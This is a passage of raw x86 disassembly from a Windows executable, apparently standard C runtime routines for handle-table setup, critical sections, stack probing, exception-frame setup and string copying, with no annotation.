  42351a:	mov    DWORD PTR [esi],eax
  42351c:	lea    ecx,[eax+0x480]
  423522:	jmp    0x42353a
  423524:	and    BYTE PTR [eax+0x4],0x0
  423528:	or     DWORD PTR [eax],0xffffffff
  42352b:	and    DWORD PTR [eax+0x8],0x0
  42352f:	mov    BYTE PTR [eax+0x5],0xa
  423533:	mov    ecx,DWORD PTR [esi]
  423535:	add    eax,0x24
  423538:	add    ecx,ebx
  42353a:	cmp    eax,ecx
  42353c:	jb     0x423524
  42353e:	add    esi,0x4
  423541:	cmp    DWORD PTR ds:0x45d148,edi
  423547:	jl     0x423508
  423549:	jmp    0x423551
  42354b:	mov    edi,DWORD PTR ds:0x45d148
  423551:	xor    ebx,ebx
  423553:	test   edi,edi
  423555:	jle    0x4235c1
  423557:	mov    eax,DWORD PTR [esp+0x10]
  42355b:	mov    eax,DWORD PTR [eax]
  42355d:	cmp    eax,0xffffffff
  423560:	je     0x4235b6
  423562:	mov    cl,BYTE PTR [ebp+0x0]
  423565:	test   cl,0x1
  423568:	je     0x4235b6
  42356a:	test   cl,0x8
  42356d:	jne    0x42357a
  42356f:	push   eax
  423570:	call   DWORD PTR ds:0x42805c
  423576:	test   eax,eax
  423578:	je     0x4235b6
  42357a:	mov    ecx,ebx
  42357c:	mov    eax,ebx
  42357e:	and    eax,0x1f
  423581:	lea    eax,[eax+eax*8]
  423584:	sar    ecx,0x5
  423587:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  42358e:	lea    esi,[ecx+eax*4]
  423591:	mov    eax,DWORD PTR [esp+0x10]
  423595:	mov    eax,DWORD PTR [eax]
  423597:	mov    DWORD PTR [esi],eax
  423599:	mov    al,BYTE PTR [ebp+0x0]
  42359c:	mov    BYTE PTR [esi+0x4],al
  42359f:	lea    eax,[esi+0xc]
  4235a2:	push   0xfa0
  4235a7:	push   eax
  4235a8:	call   0x4248ed
  4235ad:	test   eax,eax
  4235af:	pop    ecx
  4235b0:	pop    ecx
  4235b1:	je     0x4235e1
  4235b3:	inc    DWORD PTR [esi+0x8]
  4235b6:	add    DWORD PTR [esp+0x10],0x4
  4235bb:	inc    ebx
  4235bc:	inc    ebp
  4235bd:	cmp    ebx,edi
  4235bf:	jl     0x423557
  4235c1:	xor    ebx,ebx
  4235c3:	mov    ecx,DWORD PTR ds:0x45d160
  4235c9:	lea    eax,[ebx+ebx*8]
  4235cc:	lea    esi,[ecx+eax*4]
  4235cf:	cmp    DWORD PTR [esi],0xffffffff
  4235d2:	jne    0x423643
  4235d4:	test   ebx,ebx
  4235d6:	mov    BYTE PTR [esi+0x4],0x81
  4235da:	jne    0x4235e6
  4235dc:	push   0xfffffff6
  4235de:	pop    eax
  4235df:	jmp    0x4235f0
  4235e1:	or     eax,0xffffffff
  4235e4:	jmp    0x42365f
  4235e6:	mov    eax,ebx
  4235e8:	dec    eax
  4235e9:	neg    eax
  4235eb:	sbb    eax,eax
  4235ed:	add    eax,0xfffffff5
  4235f0:	push   eax
  4235f1:	call   DWORD PTR ds:0x428038
  4235f7:	mov    edi,eax
  4235f9:	cmp    edi,0xffffffff
  4235fc:	je     0x42363d
  4235fe:	push   edi
  4235ff:	call   DWORD PTR ds:0x42805c
  423605:	test   eax,eax
  423607:	je     0x42363d
  423609:	and    eax,0xff
  42360e:	cmp    eax,0x2
  423611:	mov    DWORD PTR [esi],edi
  423613:	jne    0x42361b
  423615:	or     BYTE PTR [esi+0x4],0x40
  423619:	jmp    0x423624
  42361b:	cmp    eax,0x3
  42361e:	jne    0x423624
  423620:	or     BYTE PTR [esi+0x4],0x8
  423624:	lea    eax,[esi+0xc]
  423627:	push   0xfa0
  42362c:	push   eax
  42362d:	call   0x4248ed
  423632:	test   eax,eax
  423634:	pop    ecx
  423635:	pop    ecx
  423636:	je     0x4235e1
  423638:	inc    DWORD PTR [esi+0x8]
  42363b:	jmp    0x423647
  42363d:	or     BYTE PTR [esi+0x4],0x40
  423641:	jmp    0x423647
  423643:	or     BYTE PTR [esi+0x4],0x80
  423647:	inc    ebx
  423648:	cmp    ebx,0x3
  42364b:	jl     0x4235c3
  423651:	push   DWORD PTR ds:0x45d148
  423657:	call   DWORD PTR ds:0x428058
  42365d:	xor    eax,eax
  42365f:	pop    edi
  423660:	pop    esi
  423661:	pop    ebp
  423662:	pop    ebx
  423663:	add    esp,0x48
  423666:	ret    
  423667:	push   0xc
  423669:	push   0x4284a0
  42366e:	call   0x423858
  423673:	mov    DWORD PTR [ebp-0x1c],0x428ef8
  42367a:	cmp    DWORD PTR [ebp-0x1c],0x428ef8
  423681:	jae    0x4236a5
  423683:	and    DWORD PTR [ebp-0x4],0x0
  423687:	mov    eax,DWORD PTR [ebp-0x1c]
  42368a:	mov    eax,DWORD PTR [eax]
  42368c:	test   eax,eax
  42368e:	je     0x42369b
  423690:	call   eax
  423692:	jmp    0x42369b
  423694:	xor    eax,eax
  423696:	inc    eax
  423697:	ret    
  423698:	mov    esp,DWORD PTR [ebp-0x18]
  42369b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42369f:	add    DWORD PTR [ebp-0x1c],0x4
  4236a3:	jmp    0x42367a
  4236a5:	call   0x423893
  4236aa:	ret    
  4236ab:	push   0xc
  4236ad:	push   0x4284b0
  4236b2:	call   0x423858
  4236b7:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236be:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236c5:	jae    0x4236e9
  4236c7:	and    DWORD PTR [ebp-0x4],0x0
  4236cb:	mov    eax,DWORD PTR [ebp-0x1c]
  4236ce:	mov    eax,DWORD PTR [eax]
  4236d0:	test   eax,eax
  4236d2:	je     0x4236df
  4236d4:	call   eax
  4236d6:	jmp    0x4236df
  4236d8:	xor    eax,eax
  4236da:	inc    eax
  4236db:	ret    
  4236dc:	mov    esp,DWORD PTR [ebp-0x18]
  4236df:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236e3:	add    DWORD PTR [ebp-0x1c],0x4
  4236e7:	jmp    0x4236be
  4236e9:	call   0x423893
  4236ee:	ret    
  4236ef:	call   0x423936
  4236f4:	mov    eax,ds:0x45c304
  4236f9:	cmp    eax,0xffffffff
  4236fc:	je     0x42370c
  4236fe:	push   eax
  4236ff:	call   DWORD PTR ds:0x428064
  423705:	or     DWORD PTR ds:0x45c304,0xffffffff
  42370c:	ret    
  42370d:	push   ebx
  42370e:	push   esi
  42370f:	call   DWORD PTR ds:0x428010
  423715:	push   DWORD PTR ds:0x45c304
  42371b:	mov    ebx,eax
  42371d:	call   DWORD PTR ds:0x428074
  423723:	mov    esi,eax
  423725:	test   esi,esi
  423727:	jne    0x423772
  423729:	push   0x88
  42372e:	push   0x1
  423730:	call   0x424978
  423735:	mov    esi,eax
  423737:	test   esi,esi
  423739:	pop    ecx
  42373a:	pop    ecx
  42373b:	je     0x42376a
  42373d:	push   esi
  42373e:	push   DWORD PTR ds:0x45c304
  423744:	call   DWORD PTR ds:0x428070
  42374a:	test   eax,eax
  42374c:	je     0x42376a
  42374e:	mov    DWORD PTR [esi+0x54],0x45c258
  423755:	mov    DWORD PTR [esi+0x14],0x1
  42375c:	call   DWORD PTR ds:0x42806c
  423762:	or     DWORD PTR [esi+0x4],0xffffffff
  423766:	mov    DWORD PTR [esi],eax
  423768:	jmp    0x423772
  42376a:	push   0x10
  42376c:	call   0x422920
  423771:	pop    ecx
  423772:	push   ebx
  423773:	call   DWORD PTR ds:0x428068
  423779:	mov    eax,esi
  42377b:	pop    esi
  42377c:	pop    ebx
  42377d:	ret    
  42377e:	call   0x4238ed
  423783:	test   eax,eax
  423785:	je     0x423797
  423787:	call   DWORD PTR ds:0x428078
  42378d:	cmp    eax,0xffffffff
  423790:	mov    ds:0x45c304,eax
  423795:	jne    0x42379f
  423797:	call   0x4236ef
  42379c:	xor    eax,eax
  42379e:	ret    
  42379f:	push   esi
  4237a0:	push   0x88
  4237a5:	push   0x1
  4237a7:	call   0x424978
  4237ac:	mov    esi,eax
  4237ae:	test   esi,esi
  4237b0:	pop    ecx
  4237b1:	pop    ecx
  4237b2:	je     0x4237e4
  4237b4:	push   esi
  4237b5:	push   DWORD PTR ds:0x45c304
  4237bb:	call   DWORD PTR ds:0x428070
  4237c1:	test   eax,eax
  4237c3:	je     0x4237e4
  4237c5:	mov    DWORD PTR [esi+0x54],0x45c258
  4237cc:	mov    DWORD PTR [esi+0x14],0x1
  4237d3:	call   DWORD PTR ds:0x42806c
  4237d9:	or     DWORD PTR [esi+0x4],0xffffffff
  4237dd:	mov    DWORD PTR [esi],eax
  4237df:	xor    eax,eax
  4237e1:	inc    eax
  4237e2:	pop    esi
  4237e3:	ret    
  4237e4:	call   0x4236ef
  4237e9:	xor    eax,eax
  4237eb:	pop    esi
  4237ec:	ret    
  4237ed:	cmp    DWORD PTR ds:0x45cac4,0x2
  4237f4:	jne    0x423803
  4237f6:	cmp    DWORD PTR ds:0x45cad0,0x5
  4237fd:	jb     0x423803
  4237ff:	xor    eax,eax
  423801:	inc    eax
  423802:	ret    
  423803:	push   0x3
  423805:	pop    eax
  423806:	ret    
  423807:	xor    eax,eax
  423809:	cmp    DWORD PTR [esp+0x4],eax
  42380d:	push   0x0
  42380f:	sete   al
  423812:	push   0x1000
  423817:	push   eax
  423818:	call   DWORD PTR ds:0x428080
  42381e:	test   eax,eax
  423820:	mov    ds:0x45d140,eax
  423825:	je     0x423851
  423827:	call   0x4237ed
  42382c:	cmp    eax,0x3
  42382f:	mov    ds:0x45d144,eax
  423834:	jne    0x423854
  423836:	push   0x3f8
  42383b:	call   0x424bfa
  423840:	test   eax,eax
  423842:	pop    ecx
  423843:	jne    0x423854
  423845:	push   DWORD PTR ds:0x45d140
  42384b:	call   DWORD PTR ds:0x42807c
  423851:	xor    eax,eax
  423853:	ret    
  423854:	xor    eax,eax
  423856:	inc    eax
  423857:	ret    
  423858:	push   0x425728
  42385d:	mov    eax,fs:0x0
  423863:	push   eax
  423864:	mov    eax,DWORD PTR [esp+0x10]
  423868:	mov    DWORD PTR [esp+0x10],ebp
  42386c:	lea    ebp,[esp+0x10]
  423870:	sub    esp,eax
  423872:	push   ebx
  423873:	push   esi
  423874:	push   edi
  423875:	mov    eax,DWORD PTR [ebp-0x8]
  423878:	mov    DWORD PTR [ebp-0x18],esp
  42387b:	push   eax
  42387c:	mov    eax,DWORD PTR [ebp-0x4]
  42387f:	mov    DWORD PTR [ebp-0x4],0xffffffff
  423886:	mov    DWORD PTR [ebp-0x8],eax
  423889:	lea    eax,[ebp-0x10]
  42388c:	mov    fs:0x0,eax
  423892:	ret    
  423893:	mov    ecx,DWORD PTR [ebp-0x10]
  423896:	mov    DWORD PTR fs:0x0,ecx
  42389d:	pop    ecx
  42389e:	pop    edi
  42389f:	pop    esi
  4238a0:	pop    ebx
  4238a1:	leave  
  4238a2:	push   ecx
  4238a3:	ret    
  4238a4:	int3   
  4238a5:	int3   
  4238a6:	int3   
  4238a7:	int3   
  4238a8:	int3   
  4238a9:	int3   
  4238aa:	int3   
  4238ab:	int3   
  4238ac:	int3   
  4238ad:	int3   
  4238ae:	int3   
  4238af:	int3   
  4238b0:	cmp    eax,0x1000
  4238b5:	jae    0x4238c5
  4238b7:	neg    eax
  4238b9:	add    eax,esp
  4238bb:	add    eax,0x4
  4238be:	test   DWORD PTR [eax],eax
  4238c0:	xchg   esp,eax
  4238c1:	mov    eax,DWORD PTR [eax]
  4238c3:	push   eax
  4238c4:	ret    
  4238c5:	push   ecx
  4238c6:	lea    ecx,[esp+0x8]
  4238ca:	sub    ecx,0x1000
  4238d0:	sub    eax,0x1000
  4238d5:	test   DWORD PTR [ecx],eax
  4238d7:	cmp    eax,0x1000
  4238dc:	jae    0x4238ca
  4238de:	sub    ecx,eax
  4238e0:	mov    eax,esp
  4238e2:	test   DWORD PTR [ecx],eax
  4238e4:	mov    esp,ecx
  4238e6:	mov    ecx,DWORD PTR [eax]
  4238e8:	mov    eax,DWORD PTR [eax+0x4]
  4238eb:	push   eax
  4238ec:	ret    
  4238ed:	push   esi
  4238ee:	push   edi
  4238ef:	xor    esi,esi
  4238f1:	mov    edi,0x45cc20
  4238f6:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  4238fe:	jne    0x42391e
  423900:	lea    eax,[esi*8+0x45c310]
  423907:	mov    DWORD PTR [eax],edi
  423909:	push   0xfa0
  42390e:	push   DWORD PTR [eax]
  423910:	add    edi,0x18
  423913:	call   0x4248ed
  423918:	test   eax,eax
  42391a:	pop    ecx
  42391b:	pop    ecx
  42391c:	je     0x42392a
  42391e:	inc    esi
  42391f:	cmp    esi,0x24
  423922:	jl     0x4238f6
  423924:	xor    eax,eax
  423926:	inc    eax
  423927:	pop    edi
  423928:	pop    esi
  423929:	ret    
  42392a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423932:	xor    eax,eax
  423934:	jmp    0x423927
  423936:	push   ebx
  423937:	mov    ebx,DWORD PTR ds:0x428060
  42393d:	push   esi
  42393e:	mov    esi,0x45c310
  423943:	push   edi
  423944:	mov    edi,DWORD PTR [esi]
  423946:	test   edi,edi
  423948:	je     0x42395d
  42394a:	cmp    DWORD PTR [esi+0x4],0x1
  42394e:	je     0x42395d
  423950:	push   edi
  423951:	call   ebx
  423953:	push   edi
  423954:	call   0x42446a
  423959:	and    DWORD PTR [esi],0x0
  42395c:	pop    ecx
  42395d:	add    esi,0x8
  423960:	cmp    esi,0x45c430
  423966:	jl     0x423944
  423968:	mov    esi,0x45c310
  42396d:	pop    edi
  42396e:	mov    eax,DWORD PTR [esi]
  423970:	test   eax,eax
  423972:	je     0x42397d
  423974:	cmp    DWORD PTR [esi+0x4],0x1
  423978:	jne    0x42397d
  42397a:	push   eax
  42397b:	call   ebx
  42397d:	add    esi,0x8
  423980:	cmp    esi,0x45c430
  423986:	jl     0x42396e
  423988:	pop    esi
  423989:	pop    ebx
  42398a:	ret    
  42398b:	push   ebp
  42398c:	mov    ebp,esp
  42398e:	mov    eax,DWORD PTR [ebp+0x8]
  423991:	push   DWORD PTR [eax*8+0x45c310]
  423998:	call   DWORD PTR ds:0x42808c
  42399e:	pop    ebp
  42399f:	ret    
  4239a0:	push   ebp
  4239a1:	mov    ebp,esp
  4239a3:	push   esi
  4239a4:	mov    esi,DWORD PTR [ebp+0x8]
  4239a7:	lea    esi,[esi*8+0x45c310]
  4239ae:	cmp    DWORD PTR [esi],0x0
  4239b1:	je     0x4239b8
  4239b3:	xor    eax,eax
  4239b5:	inc    eax
  4239b6:	jmp    0x423a1c
  4239b8:	push   edi
  4239b9:	push   0x18
  4239bb:	call   0x424582
  4239c0:	mov    edi,eax
  4239c2:	test   edi,edi
  4239c4:	pop    ecx
  4239c5:	jne    0x4239d6
  4239c7:	call   0x425800
  4239cc:	mov    DWORD PTR [eax],0xc
  4239d2:	xor    eax,eax
  4239d4:	jmp    0x423a1b
  4239d6:	push   0xa
  4239d8:	call   0x423a1f
  4239dd:	cmp    DWORD PTR [esi],0x0
  4239e0:	pop    ecx
  4239e1:	jne    0x423a09
  4239e3:	push   0xfa0
  4239e8:	push   edi
  4239e9:	call   0x4248ed
  4239ee:	test   eax,eax
  4239f0:	pop    ecx
  4239f1:	pop    ecx
  4239f2:	jne    0x423a05
  4239f4:	push   edi
  4239f5:	call   0x42446a
  4239fa:	push   0xa
  4239fc:	call   0x42398b
  423a01:	pop    ecx
  423a02:	pop    ecx
  423a03:	jmp    0x4239c7
  423a05:	mov    DWORD PTR [esi],edi
  423a07:	jmp    0x423a10
  423a09:	push   edi
  423a0a:	call   0x42446a
  423a0f:	pop    ecx
  423a10:	push   0xa
  423a12:	call   0x42398b
  423a17:	xor    eax,eax
  423a19:	pop    ecx
  423a1a:	inc    eax
  423a1b:	pop    edi
  423a1c:	pop    esi
  423a1d:	pop    ebp
  423a1e:	ret    
  423a1f:	push   ebp
  423a20:	mov    ebp,esp
  423a22:	mov    eax,DWORD PTR [ebp+0x8]
  423a25:	push   esi
  423a26:	lea    esi,[eax*8+0x45c310]
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	jne    0x423a45
  423a32:	push   eax
  423a33:	call   0x4239a0
  423a38:	test   eax,eax
  423a3a:	pop    ecx
  423a3b:	jne    0x423a45
  423a3d:	push   0x11
  423a3f:	call   0x422920
  423a44:	pop    ecx
  423a45:	push   DWORD PTR [esi]
  423a47:	call   DWORD PTR ds:0x428090
  423a4d:	pop    esi
  423a4e:	pop    ebp
  423a4f:	ret    
  423a50:	push   esi
  423a51:	push   DWORD PTR ds:0x45d268
  423a57:	call   0x4259b6
  423a5c:	pop    ecx
  423a5d:	mov    ecx,DWORD PTR ds:0x45d264
  423a63:	mov    esi,eax
  423a65:	mov    eax,ds:0x45d268
  423a6a:	mov    edx,ecx
  423a6c:	sub    edx,eax
  423a6e:	add    edx,0x4
  423a71:	cmp    esi,edx
  423a73:	jae    0x423ac3
  423a75:	mov    ecx,0x800
  423a7a:	cmp    esi,ecx
  423a7c:	jae    0x423a80
  423a7e:	mov    ecx,esi
  423a80:	add    ecx,esi
  423a82:	push   ecx
  423a83:	push   eax
  423a84:	call   0x425809
  423a89:	test   eax,eax
  423a8b:	pop    ecx
  423a8c:	pop    ecx
  423a8d:	jne    0x423aa6
  423a8f:	add    esi,0x10
  423a92:	push   esi
  423a93:	push   DWORD PTR ds:0x45d268
  423a99:	call   0x425809
  423a9e:	test   eax,eax
  423aa0:	pop    ecx
  423aa1:	pop    ecx
  423aa2:	jne    0x423aa6
  423aa4:	pop    esi
  423aa5:	ret    
  423aa6:	mov    ecx,DWORD PTR ds:0x45d264
  423aac:	sub    ecx,DWORD PTR ds:0x45d268
  423ab2:	mov    ds:0x45d268,eax
  423ab7:	sar    ecx,0x2
  423aba:	lea    ecx,[eax+ecx*4]
  423abd:	mov    DWORD PTR ds:0x45d264,ecx
  423ac3:	mov    DWORD PTR [ecx],edi
  423ac5:	add    DWORD PTR ds:0x45d264,0x4
  423acc:	mov    eax,edi
  423ace:	pop    esi
  423acf:	ret    
  423ad0:	push   0x80
  423ad5:	call   0x424582
  423ada:	test   eax,eax
  423adc:	pop    ecx
  423add:	mov    ds:0x45d268,eax
  423ae2:	jne    0x423ae8
  423ae4:	push   0x18
  423ae6:	pop    eax
  423ae7:	ret    
  423ae8:	and    DWORD PTR [eax],0x0
  423aeb:	mov    eax,ds:0x45d268
  423af0:	mov    ds:0x45d264,eax
  423af5:	xor    eax,eax
  423af7:	ret    
  423af8:	push   0xc
  423afa:	push   0x4284c0
  423aff:	call   0x423858
  423b04:	call   0x422b6b
  423b09:	and    DWORD PTR [ebp-0x4],0x0
  423b0d:	mov    edi,DWORD PTR [ebp+0x8]
  423b10:	call   0x423a50
  423b15:	mov    DWORD PTR [ebp-0x1c],eax
  423b18:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b1c:	call   0x423b2a
  423b21:	mov    eax,DWORD PTR [ebp-0x1c]
  423b24:	call   0x423893
  423b29:	ret    
  423b2a:	call   0x422b74
  423b2f:	ret    
  423b30:	push   DWORD PTR [esp+0x4]
  423b34:	call   0x423af8
  423b39:	neg    eax
  423b3b:	sbb    eax,eax
  423b3d:	neg    eax
  423b3f:	pop    ecx
  423b40:	dec    eax
  423b41:	ret    
  423b42:	push   ebp
  423b43:	mov    ebp,esp
  423b45:	sub    esp,0x10
  423b48:	push   ebx
  423b49:	xor    ebx,ebx
  423b4b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423b51:	push   esi
  423b52:	push   edi
  423b53:	jne    0x423bc2
  423b55:	push   0x428530
  423b5a:	call   DWORD PTR ds:0x428094
  423b60:	mov    edi,eax
  423b62:	cmp    edi,ebx
  423b64:	je     0x423bfd
  423b6a:	mov    esi,DWORD PTR ds:0x428018
  423b70:	push   0x428524
  423b75:	push   edi
  423b76:	call   esi
  423b78:	test   eax,eax
  423b7a:	mov    ds:0x45cd70,eax
  423b7f:	je     0x423bfd
  423b81:	push   0x428514
  423b86:	push   edi
  423b87:	call   esi
  423b89:	push   0x428500
  423b8e:	push   edi
  423b8f:	mov    ds:0x45cd74,eax
  423b94:	call   esi
  423b96:	cmp    DWORD PTR ds:0x45cac4,0x2
  423b9d:	mov    ds:0x45cd78,eax
  423ba2:	jne    0x423bc2
  423ba4:	push   0x4284e4
  423ba9:	push   edi
  423baa:	call   esi
  423bac:	test   eax,eax
  423bae:	mov    ds:0x45cd80,eax
  423bb3:	je     0x423bc2
  423bb5:	push   0x4284cc
  423bba:	push   edi
  423bbb:	call   esi
  423bbd:	mov    ds:0x45cd7c,eax
  423bc2:	mov    eax,ds:0x45cd7c
  423bc7:	test   eax,eax
  423bc9:	je     0x423c07
  423bcb:	call   eax
  423bcd:	test   eax,eax
  423bcf:	je     0x423bee
  423bd1:	lea    ecx,[ebp-0x4]
  423bd4:	push   ecx
  423bd5:	push   0xc
  423bd7:	lea    ecx,[ebp-0x10]
  423bda:	push   ecx
  423bdb:	push   0x1
  423bdd:	push   eax
  423bde:	call   DWORD PTR ds:0x45cd80
  423be4:	test   eax,eax
  423be6:	je     0x423bee
  423be8:	test   BYTE PTR [ebp-0x8],0x1
  423bec:	jne    0x423c07
  423bee:	cmp    DWORD PTR ds:0x45cad0,0x4
  423bf5:	jb     0x423c01
  423bf7:	or     BYTE PTR [ebp+0x12],0x20
  423bfb:	jmp    0x423c26
  423bfd:	xor    eax,eax
  423bff:	jmp    0x423c36
  423c01:	or     BYTE PTR [ebp+0x12],0x4
  423c05:	jmp    0x423c26
  423c07:	mov    eax,ds:0x45cd74
  423c0c:	test   eax,eax
  423c0e:	je     0x423c26
  423c10:	call   eax
  423c12:	mov    ebx,eax
  423c14:	test   ebx,ebx
  423c16:	je     0x423c26
  423c18:	mov    eax,ds:0x45cd78
  423c1d:	test   eax,eax
  423c1f:	je     0x423c26
  423c21:	push   ebx
  423c22:	call   eax
  423c24:	mov    ebx,eax
  423c26:	push   DWORD PTR [ebp+0x10]
  423c29:	push   DWORD PTR [ebp+0xc]
  423c2c:	push   DWORD PTR [ebp+0x8]
  423c2f:	push   ebx
  423c30:	call   DWORD PTR ds:0x45cd70
  423c36:	pop    edi
  423c37:	pop    esi
  423c38:	pop    ebx
  423c39:	leave  
  423c3a:	ret    
  423c3b:	int3   
  423c3c:	int3   
  423c3d:	int3   
  423c3e:	int3   
  423c3f:	int3   
  423c40:	push   edi
  423c41:	mov    edi,DWORD PTR [esp+0x8]
  423c45:	jmp    0x423cb5
  423c47:	lea    esp,[esp+0x0]
  423c4e:	mov    edi,edi
  423c50:	mov    ecx,DWORD PTR [esp+0x4]
  423c54:	push   edi
  423c55:	test   ecx,0x3
  423c5b:	je     0x423c70
  423c5d:	mov    al,BYTE PTR [ecx]
  423c5f:	add    ecx,0x1
  423c62:	test   al,al
  423c64:	je     0x423ca3
  423c66:	test   ecx,0x3
  423c6c:	jne    0x423c5d
  423c6e:	mov    edi,edi
  423c70:	mov    eax,DWORD PTR [ecx]
  423c72:	mov    edx,0x7efefeff
  423c77:	add    edx,eax
  423c79:	xor    eax,0xffffffff
  423c7c:	xor    eax,edx
  423c7e:	add    ecx,0x4
  423c81:	test   eax,0x81010100
  423c86:	je     0x423c70
  423c88:	mov    eax,DWORD PTR [ecx-0x4]
  423c8b:	test   al,al
  423c8d:	je     0x423cb2
  423c8f:	test   ah,ah
  423c91:	je     0x423cad
  423c93:	test   eax,0xff0000
  423c98:	je     0x423ca8
  423c9a:	test   eax,0xff000000
  423c9f:	je     0x423ca3
  423ca1:	jmp    0x423c70
  423ca3:	lea    edi,[ecx-0x1]
  423ca6:	jmp    0x423cb5
  423ca8:	lea    edi,[ecx-0x2]
  423cab:	jmp    0x423cb5
  423cad:	lea    edi,[ecx-0x3]
  423cb0:	jmp    0x423cb5
  423cb2:	lea    edi,[ecx-0x4]
  423cb5:	mov    ecx,DWORD PTR [esp+0xc]
  423cb9:	test   ecx,0x3
  423cbf:	je     0x423cde
  423cc1:	mov    dl,BYTE PTR [ecx]
  423cc3:	add    ecx,0x1
  423cc6:	test   dl,dl
  423cc8:	je     0x423d30
  423cca:	mov    BYTE PTR [edi],dl
  423ccc:	add    edi,0x1
  423ccf:	test   ecx,0x3
  423cd5:	jne    0x423cc1
  423cd7:	jmp    0x423cde
  423cd9:	mov    DWORD PTR [edi],edx
  423cdb:	add    edi,0x4
  423cde:	mov    edx,0x7efefeff
  423ce3:	mov    eax,DWORD PTR [ecx]
  423ce5:	add    edx,eax
  423ce7:	xor    eax,0xffffffff
  423cea:	xor    eax,edx
  423cec:	mov    edx,DWORD PTR [ecx]
  423cee:	add    ecx,0x4
  423cf1:	test   eax,0x81010100
  423cf6:	je     0x423cd9
  423cf8:	test   dl,dl
  423cfa:	je     0x423d30
  423cfc:	test   dh,dh
  423cfe:	je     0x423d27
  423d00:	test   edx,0xff0000
  423d06:	je     0x423d1a
  423d08:	test   edx,0xff000000
  423d0e:	je     0x423d12
  423d10:	jmp    0x423cd9
  423d12:	mov    DWORD PTR [edi],edx
  423d14:	mov    eax,DWORD PTR [esp+0x8]
  423d18:	pop    edi
  423d19:	ret    
  423d1a:	mov    WORD PTR [edi],dx
  423d1d:	mov    eax,DWORD PTR [esp+0x8]
  423d21:	mov    BYTE PTR [edi+0x2],0x0
  423d25:	pop    edi
  423d26:	ret    
  423d27:	mov    WORD PTR [edi],dx
  423d2a:	mov    eax,DWORD PTR [esp+0x8]
  423d2e:	pop    edi
  423d2f:	ret    
  423d30:	mov    BYTE PTR [edi],dl
  423d32:	mov    eax,DWORD PTR [esp+0x8]
  423d36:	pop    edi
  423d37:	ret    
  423d38:	int3   
  423d39:	int3   
  423d3a:	int3   
  423d3b:	int3   
  423d3c:	int3   
  423d3d:	int3   
  423d3e:	int3   
  423d3f:	int3   
  423d40:	mov    ecx,DWORD PTR [esp+0xc]
  423d44:	push   edi
  423d45:	test   ecx,ecx
  423d47:	je     0x423ddf
  423d4d:	push   esi
  423d4e:	push   ebx
  423d4f:	mov    ebx,ecx
  423d51:	mov    esi,DWORD PTR [esp+0x14]
  423d55:	test   esi,0x3
  423d5b:	mov    edi,DWORD PTR [esp+0x10]
  423d5f:	jne    0x423d6c
  423d61:	shr    ecx,0x2
  423d64:	jne    0x423def
  423d6a:	jmp    0x423d93
  423d6c:	mov    al,BYTE PTR [esi]
  423d6e:	add    esi,0x1
  423d71:	mov    BYTE PTR [edi],al
  423d73:	add    edi,0x1
  423d76:	sub    ecx,0x1
  423d79:	je     0x423da6
  423d7b:	test   al,al
  423d7d:	je     0x423dae
  423d7f:	test   esi,0x3
  423d85:	jne    0x423d6c
  423d87:	mov    ebx,ecx
  423d89:	shr    ecx,0x2
  423d8c:	jne    0x423def
  423d8e:	and    ebx,0x3
  423d91:	je     0x423da6
  423d93:	mov    al,BYTE PTR [esi]
  423d95:	add    esi,0x1
  423d98:	mov    BYTE PTR [edi],al
  423d9a:	add    edi,0x1
  423d9d:	test   al,al
  423d9f:	je     0x423dd8
  423da1:	sub    ebx,0x1
  423da4:	jne    0x423d93
  423da6:	mov    eax,DWORD PTR [esp+0x10]
  423daa:	pop    ebx
  423dab:	pop    esi
  423dac:	pop    edi
  423dad:	ret    
  423dae:	test   edi,0x3
  423db4:	je     0x423dcc
  423db6:	mov    BYTE PTR [edi],al
  423db8:	add    edi,0x1
  423dbb:	sub    ecx,0x1
  423dbe:	je     0x423e5c
  423dc4:	test   edi,0x3
  423dca:	jne    0x423db6
  423dcc:	mov    ebx,ecx
  423dce:	shr    ecx,0x2
  423dd1:	jne    0x423e47
  423dd3:	mov    BYTE PTR [edi],al
  423dd5:	add    edi,0x1
  423dd8:	sub    ebx,0x1
  423ddb:	jne    0x423dd3
  423ddd:	pop    ebx
  423dde:	pop    esi
  423ddf:	mov    eax,DWORD PTR [esp+0x8]
  423de3:	pop    edi
  423de4:	ret    
  423de5:	mov    DWORD PTR [edi],edx
  423de7:	add    edi,0x4
  423dea:	sub    ecx,0x1
  423ded:	je     0x423d8e
  423def:	mov    edx,0x7efefeff
  423df4:	mov    eax,DWORD PTR [esi]
  423df6:	add    edx,eax
  423df8:	xor    eax,0xffffffff
  423dfb:	xor    eax,edx
  423dfd:	mov    edx,DWORD PTR [esi]
  423dff:	add    esi,0x4
  423e02:	test   eax,0x81010100
  423e07:	je     0x423de5
  423e09:	test   dl,dl
  423e0b:	je     0x423e39
  423e0d:	test   dh,dh
  423e0f:	je     0x423e2f
  423e11:	test   edx,0xff0000
  423e17:	je     0x423e25
  423e19:	test   edx,0xff000000
  423e1f:	jne    0x423de5
  423e21:	mov    DWORD PTR [edi],edx
  423e23:	jmp    0x423e3d
  423e25:	and    edx,0xffff
  423e2b:	mov    DWORD PTR [edi],edx
  423e2d:	jmp    0x423e3d
  423e2f:	and    edx,0xff
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	jmp    0x423e3d
  423e39:	xor    edx,edx
  423e3b:	mov    DWORD PTR [edi],edx
  423e3d:	add    edi,0x4
  423e40:	xor    eax,eax
  423e42:	sub    ecx,0x1
  423e45:	je     0x423e53
  423e47:	xor    eax,eax
  423e49:	mov    DWORD PTR [edi],eax
  423e4b:	add    edi,0x4
  423e4e:	sub    ecx,0x1
  423e51:	jne    0x423e49
  423e53:	and    ebx,0x3
  423e56:	jne    0x423dd3
  423e5c:	mov    eax,DWORD PTR [esp+0x10]
  423e60:	pop    ebx
  423e61:	pop    esi
  423e62:	pop    edi
  423e63:	ret    
  423e64:	int3   
  423e65:	int3   
  423e66:	int3   
  423e67:	int3   
  423e68:	int3   
  423e69:	int3   
  423e6a:	int3   
  423e6b:	int3   
  423e6c:	int3   
  423e6d:	int3   
  423e6e:	int3   
  423e6f:	int3   
  423e70:	mov    ecx,DWORD PTR [esp+0x4]
